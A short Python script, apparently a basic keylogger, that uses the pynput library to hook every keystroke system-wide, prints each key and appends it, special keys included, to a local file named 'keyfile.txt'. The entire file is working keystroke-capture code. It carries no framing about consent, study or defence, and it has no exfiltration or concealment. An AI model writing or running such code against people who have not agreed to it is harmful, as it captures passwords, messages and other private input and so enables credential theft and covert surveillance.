from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            # For normal keys
            logKey.write(key.char)
        except AttributeError:
            # For special keys (e.g., space, enter, shift)
            if key == keyboard.Key.space:
                logKey.write(" ")
            elif key == keyboard.Key.enter:
                logKey.write("\n")
            else:
                logKey.write(f" [{key}] ")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
